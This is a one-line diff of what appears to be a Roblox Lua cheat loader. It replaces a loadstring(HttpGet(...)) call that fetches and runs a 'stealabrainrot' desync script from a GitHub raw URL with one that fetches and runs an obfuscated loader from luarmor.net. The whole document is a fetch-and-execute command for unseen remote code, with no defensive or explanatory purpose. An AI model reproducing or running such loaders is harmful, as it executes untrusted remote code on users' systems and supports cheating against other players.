@@ -1,1 +1,1 @@
-loadstring(Game:HttpGet("https://raw.githubusercontent.com/rexzysab/stealabrainrot/refs/heads/main/desync"))()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/071a44e5899c239b453cce24c4e90e29.lua"))()
